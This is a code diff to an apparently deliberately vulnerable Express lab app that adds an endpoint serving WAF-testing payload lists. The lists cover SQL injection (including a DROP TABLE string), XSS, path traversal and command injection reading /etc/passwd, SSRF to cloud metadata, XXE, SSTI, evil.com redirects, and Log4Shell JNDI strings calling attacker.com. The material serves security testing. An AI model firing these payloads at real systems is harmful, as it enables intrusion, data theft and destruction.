@@ -267,6 +267,73 @@ app.get('/api/stats', (req, res) => {
   res.json(stats);
 });
 
+// API pour les payloads de test WAF
+app.get('/api/payloads', (req, res) => {
+  const payloads = {
+    'SQLi': [
+      "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "' OR 1=1#", "admin'--",
+      "1' ORDER BY 1--", "1 UNION SELECT 1,2,3--", "' UNION SELECT NULL,NULL,NULL--",
+      "'; WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)#",
+      "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+      "'/**/OR/**/1=1--", "' OR 'x'='x", "'; DROP TABLE users--"
+    ],
+    'XSS': [
+      "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>", "<body onload=alert('XSS')>",
+      "<input onfocus=alert('XSS') autofocus>", "<a href=javascript:alert('XSS')>click</a>",
+      "<iframe src=javascript:alert('XSS')>", "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "<SCRIPT>alert('XSS')</SCRIPT>", "javascript:alert('XSS')"
+    ],
+    'Path Traversal': [
+      "../../../etc/passwd", "../../../../etc/passwd", "../../../../../../../etc/passwd",
+      "..\\..\\..\\..\\windows\\win.ini", "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "../../../etc/passwd%00",
+      "....//....//....//etc/passwd"
+    ],
+    'Command Injection': [
+      "; ls -la", "| ls -la", "& ls -la", "&& ls -la", "; cat /etc/passwd",
+      "| cat /etc/passwd", "; id", "| whoami", "$(cat /etc/passwd)", "`id`",
+      "%0a cat /etc/passwd", "; sleep 5"
+    ],
+    'SSRF': [
+      "http://127.0.0.1/", "http://localhost/", "http://[::1]/",
+      "http://169.254.169.254/", "http://169.254.169.254/latest/meta-data/",
+      "file:///etc/passwd", "http://127.0.0.1:22/", "http://2130706433/"
+    ],
+    'NoSQLi': [
+      '{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}',
+      '{"username":{"$ne":null},"password":{"$ne":null}}',
+      '{"$or":[{},{}]}', '{"$where":"1==1"}'
+    ],
+    'LFI': [
+      "php://filter/convert.base64-encode/resource=index.php",
+      "/etc/passwd", "/proc/self/environ", "../../../../etc/passwd",
+      "....//....//....//etc/passwd"
+    ],
+    'SSTI': [
+      "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}",
+      "{{''.__class__.__mro__[1].__subclasses__()}}"
+    ],
+    'XXE': [
+      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>'
+    ],
+    'Open Redirect': [
+      "//evil.com", "///evil.com", "http://evil.com", "/\\evil.com",
+      "//evil.com/%2F..", "http://google.com@evil.com"
+    ],
+    'Sensitive Files': [
+      ".git/config", ".env", "wp-config.php", "package.json",
+      ".htaccess", "docker-compose.yml", "backup.sql"
+    ],
+    'Log4Shell': [
+      "${jndi:ldap://attacker.com/a}", "${jndi:rmi://attacker.com/a}",
+      "${${lower:j}ndi:ldap://attacker.com/a}"
+    ]
+  };
+  res.json(payloads);
+});
+
 // ========== ENDPOINTS VULNÉRABLES ==========
 
 // 1. SQL Injection
